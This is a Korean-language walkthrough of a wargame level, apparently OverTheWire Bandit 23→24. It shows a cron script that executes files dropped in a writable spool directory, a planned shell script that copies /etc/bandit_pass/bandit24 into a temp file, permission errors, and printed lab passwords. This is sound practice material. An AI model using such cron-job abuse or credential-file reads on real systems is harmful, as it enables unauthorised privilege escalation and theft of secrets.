#### A program is running automatically at regular intervals from cron, the time-based job scheduler. </br>Look in /etc/cron.d/ for the configuration and see what command is being executed.</br>NOTE: This level requires you to create your own first shell-script. </br>This is a very big step and you should be proud of yourself when you beat this level!</br>NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

#### bandit23-24 password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga

### 문제풀이
---
> /etc/cron.d

> cronjob_bandit24

> cronjob_bandit24 (/usr/bin/cronjob_bandit24.sh // 1분마다 실행 명령 파일)

#### /usr/bin/cronjob_bandit24.sh
```
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*; //모든 숨김파일(.으로 시작하는)의 목록을 대상으로
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
cronjob_bandit24는 파일 변경 불가능.

/usr/bin/cronjob_bandit24.sh도 변경 불가능.

cronjob_bandit24.sh는 /var/spool/$myname/foo의 하위 파일/디렉터리가 bandit23이라면 모두 삭제함

새로운 shell script를 만들어야함.

----

/etc/cron.d/cronjob_bandit24 -rw-r--r--
```
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

/usr/bin/cronjob_bandit24.sh -rwxr-x---
```
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
/var/spool/bandit24/foo drwxrwx-wx

1. /tmp/dir directory만들기
2. /tmp/dir/my.sh shell script만들기
3. shell script /var/spool/bandit24에 cp.

    1. /etc/cron.d/cronjob_bandit24에서 /usr/bin/cronjob_bandit24.sh의 결과를 /dev/null로 보내줌
    2. cronjob_bandit24.sh에서 /dev/null로 결과가 가기 전에 특정 파일로 보내줄수 있는지?
    * /var/spool/
    ```
    #! /bin/bash
    cat /etc/bandit_pass/bandit24 > temp/dir/pass.txt
    ```

### err

```
bandit23@bandit:/var/spool$ cp /tmp/fvdir/fvfile.sh ./
```
```
cp: cannot create regular file './fvfile.sh': Permission denied
```
명령 상태 확인
```
cp -v /tmp/fvdir/fvfile.sh .
```
```
'/tmp/fvdir/fvfile.sh' -> './fvfile.sh'
cp: cannot create regular file './fvfile.sh': Operation not permitted
```
```
ls -ld .
```
```
dr-xr-x--- 3 bandit24 bandit23 4096 Aug 15 13:16 .
//쓰기 권한 없음
```

bandit23@bandit:/var/spool/bandit24$ // 권한이 없는 상태에서 shell script를 어떻게 실행시키나...

/var/spool/bandit24/foo는 drwxrwx-wx 읽기 권한만 없지 나머지 권한은 있음.

gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8